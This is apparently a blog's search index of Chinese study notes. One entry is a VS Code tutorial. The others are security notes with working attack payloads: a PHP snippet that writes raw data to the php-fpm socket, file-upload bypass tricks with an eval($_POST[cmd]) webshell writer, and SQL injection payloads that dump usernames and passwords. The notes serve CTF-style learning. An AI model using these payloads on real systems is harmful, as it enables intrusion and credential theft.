<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[fastgci攻击姿势]]></title>
    <url>%2Ffastgci.html</url>
    <content type="text"><![CDATA[学习笔记. CGI&amp;FastCGI CGI（Common Gateway Interface）全称是“通用网关接口”,它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序 FastCGI 是CGI协议的优化版,提高了CGI的性能,对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 FastCGI的工作原理如下： php 的连接方式apche2-module把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件 CGI 模式此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web 服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web 服务器返回到客户端 FastCGI 模式fastcgi 本身还是一个协议，在 cgi 协议上进行了一些优化,fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache 去主动调用 php-cgi，而 fastcgi 进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI 此时是常驻在内存中，不会每次请求重新启动PHP-FPM 就是实现和管理 fastcgi 协议的进程 ginx 与 php-fpm 通信可以通过两种模式 TCP 模式TCP 模式即是 php-fpm 进程会监听本机上的一个端口(默认 9000)，然后 nginx 会把客户端数据通过 fastcgi 协议传给 9000 端口，php-fpm 拿到数据后会调用 cgi 进程解析 unix 套接字 (socket) 模式它是 unix 系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket 描述符文件就可以建立通道进行通信了。 phpcgi 产生的问题 除 disable_function 以外的大部分 php 配置，都可以在fastcgi协议包里面更改 未授权访问漏洞tcp模式默认使用9000端口如果9000被暴露在公网则可以直接访问,导致命令执行 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php, 通过 auto_prepend_file,php://input 则可以执行任意代码 需要注意的是在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions：,要求必须伪.php后缀,才会执行所有需要猜解web目录,如果无法得到web的目录,我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php。 SSRF+Gopher如果目标网站存在ssrf漏洞,则可以通过 SSRF利用Gopher协议 来攻击 php-fpm 攻击套接字上述都是tcp模式下的wen’t问题,如果目标网站采用了socket的链接方式,则可以通过12345&lt;?php $sock=stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock, base64_decode($_POST['A']));var_dump(fread($sock, 4096));?&gt; 进行攻击,不过需要可以进行代码执行,可能只能改改脚本不能改的配置吧,像open_basedir之类的,disable_function是不能改的,disable_function的绕过下次再说吧或者攻击另一个服务器?? 参考链接https://www.anquanke.com/post/id/186186#h2-7 https://forum.90sec.com/t/topic/129 https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#_1 https://xz.aliyun.com/t/5006]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>学习笔记</tag>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2FUntitled.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[upload总结]]></title>
    <url>%2FCtf_web%2Fupload.html</url>
    <content type="text"><![CDATA[upload-labs 不安全的检查 前端js Content-Type绕过 黑名单 可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话 ​ AddType application/x-httpd-php .php .phtml .phps .php5 .pht 上传.htaccess，实现重写文件解析, SetHandler application/x-httpd-php 同样这样的前提也是得在配置文件里面有这样的一句话 12AllowOverride AllLoadModule rewrite_module modules/mod_rewrite.so 未trim 尾部加空格绕过 ::$DATA绕过 window流文件特性 https://c1h3ng.github.io/web/2018/06/19/windows-tricks/ 未deldot 尾部加.绕过 ./ 1.php./ ./被忽略 x/../1.php./ 可以实现文件覆写 白名单 %00截断 get下%00 post下修改00字节 file截断目录 解析漏洞绕过IIS 6.0IIS 6.0解析利用方法有三种：1.目录解析建立xx.asp为名称的文件夹，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析2.文件解析后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)3.默认解析IIS6.0 默认的可执行文件除了asp还包含这三种 /xxx.asa/xxx.cer/xxx.cdx/xxx.apsx IIS 7.0/7.5在正常图片URL后添加 /.php，可以解析为php ###Apache一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全 后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3则会被解析为php 最近在出题的时候在apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了，真尴尬。 NginxNginx &lt;8.03畸形解析漏洞直接在正常图片URL后添加/.phpNginx &lt;=0.8.37在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞 在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。 文件包含利用 phar，zip等伪协议 各种函数获取图片信息 图片马制作 copy normal.jpg /b + shell.php /a webshell.jpg 对图片进行二次编译 寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分 条件竞争 这里可以使用burp去发包，可以把文件内容改成下面这样 $c123或者这样，反正就是为了写文件进去就对了```&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd]?&gt;&apos;);?&gt;]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>学习笔记</tag>
        <tag>ctf</tag>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vs code 使用教程]]></title>
    <url>%2FCtf_web%2Fvc%20code%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html</url>
    <content type="text"><![CDATA[vs code 使用教程 常见操作黑苹果对应mac的键( Ctrl —cmd Win-ctrl Alt-option ) 基础理论学习编辑器,在学什么 学习编程语言举例 ​ 开始,不熟悉编程语言,找一本官方手册,事无巨细的学习一遍, 掌握后,学习新的编程语言,不能同第一遍一样, 其实编程语言在设计上大同小异，新的编程语言往往都是在解决老的语言的某一个短板，但他们在最本质的设计上不会有大的变化 学习编辑器 你关心的应该是它能用来做什么，它最擅长做什么，以及它做不了什么，就是这个工具的“下限”和“上限”。 首先，我们一起来找下编辑器或者 IDE 的“下限”。 快捷键的选用 VS Code 的做法是搭配组合辅助键 Ctrl、Alt 和 Meta 键，然后根据当前用户正在使用的组件来决定是什么功能 Vim 则是运用了“模态”的概念，把输入文本信息，和光标移动、文本操作等分开为不同的模态，不同模态各有一套自己的快捷键。 编程语言与框架支持 对工作流的选择和支持 说完“下限”，我们再接着来说说编辑器的“上限”。 编辑器支持用户写插件来定制功能，那它的“上限”就很高了 但扩展编辑器这个事情，由于最终还是要落实到社区和个人，真正能达到的高度就很难说了。 Eclipse 插件开发语言 Java,插件运行在主进程中,插件影响ide性能 Atom VS code -语言是JavaScript Emacs插件适Lisp,Vim是VimL 三步走的演变过程 最开始的时候，我特别关心快捷键和语言支持，在这上面花了很多时间，这个过程就像是打怪升级，不断更新自己的装备库； 再往后，我就会开始挑剔编辑器的其他组件，但凡是跟自己的工作习惯或者工作流不匹配的，就会想办法换掉它，这是个做减法的过程； 最后一步，就是自己学习写插件了，编辑器本身的功能和社区不能够完全满足自己的需求，本着“麻烦别人不如磨炼自己”的精神，我开始自己动手。 vs code why,how,what 定位:编辑器,但又不局限与此 设计思路 vs code 的发展轨迹 2011 年底，微软从 IBM 请来了 Erich Gamma,希望他能够打造一款在线的开发工具，让开发者们能够在浏览器里获得 IDE 般的开发体验2015 年，Erich Gamma 带领团队把 Monaco Editor 移植到桌面平台上，也就是这个专栏的主角 Visual Studio Code，即 VS Code。 开源与开放的平台 首先，VS Code 的源代码以 MIT 协议开源 其次，开发过程和反馈渠道的开放。 再次，接口的开放 VS Code 学习指南 核心编辑器的使用。 工作台、工作区的使用 VS Code 定制和插件开发。 上手vs code “学习”区域的三个功能： 命令 面板 Cmd+Shift+P 或 F1 命令面板中快速搜索命令并且执行,,绝大多数命令都可以在命令面板里搜到 界面概览 VS Code 默认界面里的不同部件的位置、名称和快捷键。 交互式演习场 全英文的初学者教程 命令行的使用 安装后打开命令面板，搜索Shell 命令：在 PATH 中安装 “Code” 命令并执行，然后重启终端模拟就可以了。 code —help 显示帮助 最基本的命令行使用方式是在 code 命令后加上文件或者文件夹的地址，这样VS Code 就会在一个新窗口中打开这个文件或文件夹。,如果希望使用已打开的窗口打开,加上-r参数 参数 -g &lt;file:line[:character]&gt; 打开文件，然后滚动到文件中某个特定的行和列，比如输入 code -r -g package.json:128命令，你就可以打开 package.json 这个文件，然后自动跳转到 128 行,可以用于错误定位 只需使用 -d参数，并传入两个文件路径，比如输入 code -r -d a.txt b.txt命令，就可以比较a.txt和b.txt两个文件的内容了 也接受来自管道中的数据,此时只需使用ls | code -命令 如何双手不离开键盘键盘操作：光标的移动、文本的选择、文本的删除，以及如何为编辑器命令绑定快捷键 光标的移动 针对单词的光标移动 一个单词一个单词的移动, 光标直接移动到整个单词的前面,Option(alt)（Windows 上是 Ctrl 键）和左方向键。相反，如果要把光标移动到单词的末尾，只需要按下 Option 和右方向键就好了。 第二种方式是把光标移动到行首或者行末 使用cmd(ctrl)键,左右方向键,window上是home和end键 对于代码块的光标移动 Cmd + Shift + \（Windows 上是 Ctrl + Shift + \），就可以在这对花括号之间跳转。 移动到文档的第一行或者最后一行 Cmd 和上下方向键即可（Windows 上是 Ctrl + Home/End 键） 文本选择 你只需要多按一个 Shift 键，就可以在移动光标的同时选中其中的文本。 删除操作 先选中,在按删除键 Cmd 和 Backspace(Delete),删除左侧(右侧)所有内容 option和 Backspace(Delete),删除左侧(右侧)单词 按下 “ Cmd + Shift + K ” (Windows 上是 “Ctrl + Shift + K”)，当前代码行就可以被删除了。 剪贴 剪切代码 Cmd + x ” (Windows 上是 “Ctrl + x”) 即可 自定义快捷键 快捷键进阶 代码行编辑。 你想在当前行的下面新开始一行时，你只需按下 “Cmd + Enter” （Windows 上是 “Ctrl + Enter”）；而当你想在当前行的上面新开始一行时，你只要按下 “Cmd + Shift + Enter” （Windows 上是 “Ctrl + Shift + Enter”）就行了。 移动一段代码时，一般你可能会分三步走：先选中，再剪切，最后粘贴。不过我更喜欢的是按住 “Option + 上下方向键”（Windows中就是“Alt + 上下方向键”） ，将当前行，或者当前选中的几行代码，在编辑器里上下移动。 编程语言相关命令 添加注释 注释一行代码 Cmd + / ” （Windows 上时 “Ctrl + /”） 如果你需要把一整段代码注释掉，按下 “ Option + Shift + A”即可。 代码格式化 Option + Shift + F” （Windows 上是 Alt + Shift + F）来对整个文档进行格式 也可以选中一段代码，然后按下 “Cmd + K Cmd + F” （Windows 上是 Ctrl + K Ctrl + F），对选中代码格式化 代码缩进 搜索 “缩进”，然后使用 “重新缩进行” 将整个文档的缩进进行调整，但更多时候，你只需要运行 “重新缩进选中行” 来调整部分选中代码行的缩进。 其他 第一个是调换字符的位置。你可以按下 “Ctrl + t” （Windows 上未绑定快捷键，可以打开命令面板，搜索 ”转置游标处的字符“） 来把当前光标前后的字符调换位置。 第二个是调整字符的大小写，我估计这个你会经常用到。你可以选中一串字符，然后在命令面板里运行“转换为大写”或 “转换为小写”, 来变换字符的大小写。 第三个是合并代码行。有的时候你可能会为了避免代码看起来过于冗余，就会把比较短小的几行代码合并到一行里面去。这时，你只需要按下 “ Ctrl + j ” 第四个是行排序。无论是你在写代码，还是写 Markdown，你都可以把代码行按照字母序进行重新排序。不过这个命令比较小众，VS Code 并没有给这个命令指定快捷键，你可以调出命令面板，然后搜索 “按升序排列行” 或者 “按降序排列行” 命令执行。 第五个是撤销光标的移动和选择。有的时候你移动完光标之后，又希望把光标回退到上一个位置，这时你只需按下 “Cmd + U”（Windows 上是 “Ctrl + U”），就可以撤销这一次光标的移动。 多光标特性 创建多个光标 第一种添加多光标的方式，就是使用鼠标。在键盘上按住 “Option”（Windows 上是 Alt），然后鼠标点在第二个“5”之前，那么第二个光标就创建好了 使用键盘 Cmd + Option + 下方向键”（Windows 上是 “Ctrl + Alt + 下方向键”），在当前光标的下面创建一个光标 按下 “Cmd + 右方向键”（Windows 上是 End），这样它们就都移动到每一行的末尾了。 创建多光标的两个特别的命令 1. “Cmd + D” 你把光标移动到数字“5”之前，按下 “Cmd + D”，这样第一个“5”就被选中了；然后再按一次 “Cmd + D”（Windows 上是 Ctrl + D），你可以看到，第二个“5”也被选中了。 2. Option + Shift + i首先你选择多行代码，然后按下 “Option + Shift + i” （Windows 上是 Alt + Shift + i），这样操作的结果是：每一行的最后都会创建一个新的光标 如何快速在文件,符号和代码之间跳转 文件跳转 “Ctrl+Tab”，(alt )键然后继续按着 “Ctrl”键但是松开 “Tab” 键，这样你就可以打开一个文件列表，这个列表罗列了当前打开的所有文件。接下来，你可以通过按下 “Tab”键在这个列表里跳转，选择你想要打开的文件。最后选到你想打开的文件后，松开 “Ctrl” 键，这个文件就被打开了 “Cmd + P” （Windows 上是 Ctrl + P）时，就会跳出一个最近打开文件的列表，同时在列表的顶部还有一个搜索框,,找到文件后,按Cmd + Enter ” （Windows 上是 Ctrl + Enter）组合键文件在一个新的编辑器 行跳转 文件内跳转:按下 “Ctrl + g”，调出行输入框,输入行号跳转 其他文件的某一行:先按下 “Cmd + P”，输入文件名，然后在这之后加上 “:”和指定行号即可 符号跳转 跳转到文件里的类定义，或者函数定义的位置 符号之间跳转，你只需按下 “Cmd + Shift + O” :对符号进行分类 如果你打开了多个 JavaScript 文件，就可以按下 “Cmd + T” （Windows 上是 Ctrl + T），搜索这些文件里的符号。 定义 (Definition) 和实现 (implementation) 跳转 按下 F12，就可以跳转到函数的定义处。 “Cmd + F12” （Windows 上是 Ctrl + F12），跳转到函数的实现的位置 引用 (Reference) 跳转 Shift + F12(alt+f12) Cmd - (win -)跳转回到原来位置 玩转鼠标操作 文本选择 在VS Code中，你单击鼠标左键就可以把光标移动到相应的位置。而双击鼠标左键，则会将当前光标下的单词选中。连续三次按下鼠标左键，则会选中当前这一行代码。最后是连续四次按下鼠标左键，则会选中整个文档。 如果你单击行号，就能够直接选中这一行。如果你在某个行号上按下鼠标，然后上下移动，则能够选中多行代码。 文本编辑 选中 bar 这个函数，然后将鼠标移到这段选中的代码之上，按下鼠标左键不松开。这时你可以看到，鼠标指针已经从一条竖线，变成了一个箭头。这时候我们移动鼠标的话，就可以把这段文本拖拽到我们想要的位置。 移动鼠标的过程中，多按了个 Option 键（Windows 上是 Ctrl 键），操作结果就由原来的“剪切+粘贴”变为“复制+粘贴”了 多光标 按住 Option 键，然后哪里需要点哪里 你只需按下鼠标中键，然后对着一段文档拖出一个框，在这个框中的代码就都被选中了，而且每一行被选中的代码，都拥有一个独立的光标。 悬停提示窗口 代码跳转和链接 然后按下 Cmd 键，这时候 foo下面出现了一个下划线。然后当我们按下鼠标左键，就跳转到了 foo函数的定义处。 编写 Markdown 这样的非编程语言的文档时，也可以通过 Cmd + 鼠标左键（Windows 上是 Ctrl + 鼠标左键）来打开超级链接。 Cmd - 跳转回到原来位置 功能的核心代码自动补全和重构自动补全 Tab 键或者回车键就可以将其补全。 可以按下 Escape()esc 键将其隐藏。后续如果希望再次看到这个窗口，除了通过打字来将其调出以外，我们还可以按下 “Ctrl + 空格键”来手动地调出建议列表 快速预览 Ctrl+空格键”组合键来快速调出这个快速预览窗口。 鼠标点蓝色感叹号 参数预览 “Cmd + Shift + Space 自动补全设置 先我们可以通过设置 “editor.quickSuggestions” 来决定在什么语境下自动补全窗口会被唤出 参数预览窗口也是一样的，你可以通过参数 “editor.parameterHints.enabled” 增大设置 “editor.quickSuggestionsDelay” 的值，这样在你输入完代码后，自动补全窗口就会多等一会儿，然后再跳出来。 其他几个自动补全的设置，你可以在设置里搜一搜 “editor.suggest”，自己修改玩一玩。 快速修复按下 “Cmd+.” （Windows 上是 Ctrl + . ）来调出这个快速修复的建议列表 重构 只需把光标放到函数或者变量名上，然后按下ctrl- F2，这样这个函数或者变量出现的地方就都会被修改 另一个常用的重构的操作就是把一段长代码抽取出来转成一个单独的函数。在VS Code中，我们只需选中那段代码，点击黄色的灯泡图标，然后选择对应的重构操作即可。 单词自动补全 editor.wordBasedSuggestions 代码片段（code snippet） 代码片段是对常用代码的一个抽象，它保留了大部分不变的代码，然后把需要经常变动的部分，换成变量，这样等下次调用它的时候，只需要把这些变量换成我们需要的就可以了。 搜索“配置用户代码片段”（Configure User Snippets）并且执行。这时候我们会看到一个列表，让我们选择语言。这里我们依然选择 JavaScript 作为我们的示例语言 我们可以选中第七行到第十四行，按下 “Cmd+ /”取消注释。 你已经看到了，这个代码片段文件，是一个 JSON 文件，它的根对象下面的所有子节点都是一个单独的代码片段，并能够被我们调用和插入编辑器。这个代码片段对象的键（key）是这个代码片段的名字，我们在书写时只要保证这个名字跟当前文件里的其他代码片段不冲突就可以了。 Tab Stop 内容里 的$1和 $2不见了，取而代之的是两个竖线。这$1和 $2就是 Tab Stop，意思是，当我们按下 Tab 键之后，光标移动到的位置。当这段代码片段被插入到编辑器后，编辑器会把光标移动到$1所在的位置，然后如果你再按一次 Tab 键，光标则会立刻移动到 $2的位置。 占位符 在我们插入 Tab Stop 的时候，除了 $1、 $2 这样的语法，我们还可以填入 ${1:label}，在这个格式下，代码片段被插入编辑器里时，$1 的位置处，会预先填入 label这个值，并且 label 会被选中。 多光标 ${1:label} 来指定 Tab Stop 和占位符，但其实我们也可以在代码片段的多个位置使用同样的 Tab Stop 。 预设变量上面我们提到了，在每个 Tab Stop 的位置，我们可以提供占位符，也就是提前预设好一些值。但这些占位符是我们提前写在代码片段里的，跟当前代码的上下文往往没什么关系。不过，VS Code 的代码片段支持里，还提供了一种模板，叫做预设变量。 比如说，我们想在代码片段里的某个位置使用剪切板的内容，那么我们在那个位置写上 $CLIPBOARD 就好了，如果我们希望插入代码片段后自己可以修改这个值，也可以将它放在一个 Tab Stop 里面，语法则是 ${1:$CLIPBOARD}。 除了剪切板，VS Code 还支持其他数十个预设值，大家可以按需自行查看文档，自己尝试。 一定要用好代码折叠、小地图和面包屑特性代码折叠 当我们按下 “Cmd + Option + 左方括号”（Windows 上是 Ctrl + Shift + 左方括号），当前光标所处的最内层的、可以被折叠的代码就会被折叠起来。请注意，我们在这里加了两个限制条件，“最内层”和“可以被折叠”。 前光标位置开始，一直到最外层的，所有可以被折叠的部分递归地折叠起来,按下 “Cmd + K ”“Cmd + 左方括号”（Windows 上是 Ctrl + K、Ctrl + 左方括号）。而至于如何递归地展开，不用问你肯定也知道，是：依次按下“Cmd + K ”“Cmd + 右方括号”。 折叠当前页面所有代码,按下 “Cmd + K”“Cmd + 0”（Windows 上是 Ctrl + K，Ctrl + 0）即可 基于语言定义的代码折叠, // region Main // endregion 小地图editor.minimap 面包屑左到右，我们能够看到一层一层文件夹的名字，然后是当前文件名，最后则是光标所在的函数的名字。我们可以通过点击这个工具栏上的文字，然后进行文件夹、文件或者是函数的跳转。 极速搜索有时候比Intellisense还重要单文件搜索 cmd+f 光标会到搜索框 cmd+g 光标不变 加shift反向跳转 按下 “Cmd + Option + R”（Windows 上是 Alt + R），就能够打开正则表达式的支持 捷键直接调出替换窗口。最常用的命令就是按下 “Cmd + Option + F” 下“Shift + Tab” 键将光标移动到上面的搜索输入框里。“Tab”和“Shift + Tab”键能够帮助你在这两个输入框直接进行跳转。 多文件搜索和替换“Cmd + Shift + F” （Windows 上是 Ctrl + Shift + F）来调出多文件搜索的视图 按三个点,支持选择文件,glob语法 通配符操作，,?,[]这三个通配符，代表0个或多个字符，?代表一个字符，[]匹配指定范围内的字符 多文件搜索配置 第一个是“search.collapseResults”。它是用来控制是否自动展开搜索结果 第二个是 “search.location” ，也就是多文件搜索视图的位置。 优化你的编辑器设置VS Code 的界面工作台 ctrl++shift+f 文件资源管理器，主要用于浏览和管理文件和文件夹。 跨文件搜索，用于在当前文件夹内进行跨文件的搜索。 win+shift+g源代码管理，用于对当前文件夹下的代码进行版本管理，默认 VS Code 支持的版本管理软件是 Git。 启动和调试，用于对当前文件夹下的项目进行运行和调试。 扩展管理，用于下载和管理 VS Code 里的插件。 命令面板首先是几个符号： &gt;（大于号） ，用于显示所有的命令。 @ ，用于显示和跳转文件中的“符号”（Symbols），在@符号后添加冒号：则可以把符号们按类别归类。 #号，用于显示和跳转工作区中的“符号”（Symbols）。 ：（冒号）， 用于跳转到当前文件中的某一行。 这几个符号所对应的命令我们在之前的文章中已经研究过，比较好记。输入这些符号后，继续输入相应内容就可以对结果进行搜索了。 剩下的都是英文单词或者缩写，知道它们的含义后就可以轻松掌握了： edt 是 edit（编辑）的缩写，输入 edt 和一个空格，命令面板就会显示所有已经打开的文件；而edt active则只会显示当前活动组中的文件。 ext 是 extension（插件）的缩写，输入 ext 和一个空格，就可以进行插件的管理；ext install 则可以在命令面板中搜索和安装插件。 task和debug 分别对应于任务和调试功能。这两个功能的使用我会在之后的章节中详细讲解。 term 是 terminal（终端）的缩写，你可以用这个命令来创建和管理终端实例。 view 则是用于打开 VS Code 的各个 UI 组件。 有趣的设置 第一个设置是“workbench.commandPalette.history”。 另一个设置是 “workbench.commandPalette.preserveInput”，它的默认值是 false。如果你把它的值改成 true 的话，那么你在命令面板里搜索了某个命令并执行了，当你下次打开命令面板的时候，之前输入的值还在命令面板的输入框里 资源管理器设置多文件夹工作区（multi-root workspace） 命令面板，搜索 “将文件夹添加到工作区” （add folder to workspace） 保存这个工作区，接下来你可以调出命令面板，搜索“将工作区另存为” （save workspace as），VS Code 就会为这个工作区创建一个文件，这个文件的后缀名是 “code-workspace”。 工作区切换 Ctrl + W，或者调出命令面板，搜索 “切换窗口（Switch Window）”，然后选择你要跳转的那个文件夹中 快速切换窗口（Quick Switch Window,要跳转到上一个打开的窗口 如果你同一时间只会关注一个项目，那你也大可不必使用多个窗口。我就经常只用一个显示器和一个窗口，然后当我想在另外一个项目上工作时，我就会按下 Ctrl + R（或者使用命令面板，搜索 “打开最近的文件”），此时我就能够看到最近操作过的文件夹并按下回车键进行切换了 当你按下 Ctrl + R 调出最近打开的文件夹的列表后，也能够按下 Cmd + 回车键，将它在一个新的窗口中打开 版本管理差异编辑器 前四个按钮 第一个按钮的功能是从差异编辑器跳转到一个普通的编辑器，并且打开这个文件。这样我们能够无干扰地进行编辑操作了 第二个按钮控制的是：是否要在差异编辑器里显示代码里行末的空格符的变化。比如说你不小心在行末添加了几个空格，默认情况下，VS Code 觉得这几个空格不影响代码，就不会在差异编辑器里显示。但我建议把它打开，这样你就可以确保能够看到所有的代码改动。 接下来的两个箭头按钮，就是用于在当前文件里的多个变动之间进行跳转了。 下拉菜单最后是一个三个点的图标，想必不用点击开你也知道，它意味着里面有更多的功能，点击后即可看到一个下拉菜单。 代码内的差异编辑配置终端模拟器创建终端 Ctrl + ` 键，一个新的终端就被创建出来了 在按Ctrl + ` 键将其隐藏。 Ctrl + Shift + `，或者在命令面板里搜索 “新建集成终端 切换 命令面板里运行 “聚焦于下一终端” （Focus Next Terminal）或者 “聚焦于上一终端” （Focus Previous Terminal）进行切换 -只需按下 Cmd + \ 或者运行 “拆分终端”（Split Terminal），就能够将当前的终端一分为二；如果再次按下这个快捷键，就能够将当前的面板平均分为三份 拆分终端之间切换的快捷方式,聚焦于下一个窗格” (Focus Next Pane)、“聚焦于上一个窗格” (Focus Previous Pane) 终端内操作 我们能够在终端里使用 Shell 自身支持的那些快捷键操作。比如在 Bash 里，我们可以按下 “Ctrl + A” 或者 “Home” 键把光标移动到一行的开头，也可以按下 “Option + 左方向键” （Windows 上是 Alt + 左方向键）把光标向前移动一个单词；如果我们在集成终端里使用的也是 Bash，那么这些操作依然生效。 VS Code 也为几个常用的操作提供了接近于编辑器命令的快捷键 按下“Cmd + F”调出搜索框 功能整合 集成终端中非常轻松地打开一个文件。按下 Cmd 键，然后把鼠标移动到这个文件名的上面，我们就能看到这个文件名下出现了一个下划线，这说明集成终端成功检测出了这个文件的位置，此时只需按下鼠标左键就能将这个文件在当前编辑器中打开 集成终端和资源管理器也有互动。比如我们打开了一个脚本文件，希望直接执行这个脚本文件，就可以打开命令面板，运行 “在活动终端中运行活动文件”（Run Active File In Active Terminal），这样这个脚本就会在当前打开的集成终端中运行了 我们也可以选中编辑器中的某段代码，然后打开命令面板，运行“在活动终端中运行所选文本”（Run Selected Text In Active Terminal），这段代码就会在终端中执行。 对了，我们在使用命令行的时候，一个经常做的操作就是 cd 进入某个文件夹，或者 cd … 回退到上一层文件夹，甚至有的时候需要多次运行这个命令才能调整到我们期望的某个文件夹下然后再进行操作。有个资源管理器，这个场景就简单多了，我们只需在目标文件夹上按下右键调出上下文菜单，然后选择 “在终端中打开”。 第二个则是关于终端的持久化,tmux 你的项目打造Workflow执行任务自定义任务debugger工作区快捷键编辑器操作 创建出多个编辑器 Cmd + \”（Windows 上是 Ctrl + \），或者从命令面板里搜寻 “拆分编辑器” （Split Editor）并运行即可实现。 你可以按下 “Cmd + 1”“Cmd + 2”和“Cmd + 3”（Windows 上是 Ctrl+1，Ctrl+2，Ctrl+3）分别在这三个编辑器跳转 纵向的布局。所以你可以使用命令 “切换垂直/水平编辑器布局” （Flip Editor Group Layout）或者按下“Cmd + Option + 0”（Windows 上是 Shift + Alt + 0）来进行布局方向的切换 tab在 Tab 之间进行跳转。你可以使用命令 “打开上/下一个编辑器”（Open Previous/Next Editor）或者按下 “Cmd + Option + 左/右方向键”（Windows 上是 Ctrl + Pagedown/Pageup）在编辑器 Tab 之间进行跳转。 要注意的是，这个命令会依次打开每个编辑器组里的每个 Tab。但是如果你只希望在某个编辑器组里进行跳转的话，那么你就需要另一个命令 “打开组中的下一个编辑器”（Open Next Editor in Group）。 移动编辑器 Tab 除了将鼠标聚焦到其他编辑器组里，VS Code 还允许我们把当前的编辑器 Tab 移动到其他编辑器组当中去。比如我们可以使用命令 “将编辑器移动到下一组”（Move Editor into Next Group），将当前的 Tab 移动到下一个编辑器组中。 网格布局 VS Code 肯定会添加命令让我们能跳转到当前编辑器上方、下方、左侧和右侧的“编辑器”。比如在下图中，我就使用了 “聚焦到上方编辑器组”（Focus Above Editor Group） Cmd + B （Windows 上是 Ctrl + B）打开或者关闭整个视图 也可以按下 Cmd + J （Windows 上是 Ctrl + J）来打开或者关闭面板 如果我们不希望看到最左侧的活动栏，或者最下面的状态栏，也可以通过命令 “切换活动栏可见性”（Toggle Activity Bar Visibility）和 “切换状态栏可见性”（Toggle Status Bar Visibility）来一键开关 通过运行 “切换禅模式”(Toggle Zen Mode)，就可以把侧边栏、面板等全部隐藏。进入禅模式后，只需按下 Escape 键，即可退出禅模式 大屏幕 切换居中布局”（Toggle Centered Layout），将编辑器放在 VS Code 工作区的正中间，同时你还可以通过拉动编辑器两边的边框，调整编辑器的宽度。如此一来，当你使用大屏幕时，就不用担心编辑器里的代码，都“缩”在屏幕的左上角了。 python语言支持Python 插件会自动读取本地的各种 Python packages，然后为你提供智能提醒。而这里特别值得一提的是，如果你有一些第三方的 Python 脚本，但是它们并没有被VS Code的 Python 插件所识别，而你又希望能够获得它们的智能提示，那你可以通过添加如下的配置来实现： 12&quot;python.autoComplete.extraPaths&quot;: [] Python 插件就会分析 python.autoComplete.extraPaths 下的所有文件夹，然后分析这些代码，并且提供 IntelliSense。]]></content>
      <categories>
        <category>杂</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入总结]]></title>
    <url>%2FCtf_web%2Fsql%E6%B3%A8%E5%85%A5.html</url>
    <content type="text"><![CDATA[笔记 测试闭合语句注释符号是否可用 ‘,”,’),”),’)) 有回显联合查询1234567891011测试显示位置?id=-1&apos; order by 3--+?id==-1&apos; union select 1,2,3--+得到‘security’库名?id=-1&apos; union select 1,2,database() --+爆表payload?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+爆列名（字段）payload?id=0&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+爆值payload,3a是十进制的58，是ascii中的 &apos;:&apos; ，用以分割pasword和username。?id=0&apos; union select 1,2,group_concat(username,0x3a,password) from users--+ 报错注入extractvalue爆表payload 1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ 爆列名（字段）payload 123456没有完全显示使用``` and column_name not in (&apos;user_id&apos;,&apos;first_name&apos;,&apos;last_name&apos;,&apos;user&apos;,&apos;avatar&apos;,&apos;last_login&apos;,&apos;failed_login&apos;) 来显示其他值： 爆值payload 1?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))—+ 123456789101112同样使用not in显示其他值### updatexmlpayload：uname=admin&amp;passwd=11&apos; and updatexml(1,concat(0x7e,(select password from (select password from users where username=&apos;admin&apos;) mingzi ),0x7e),1) 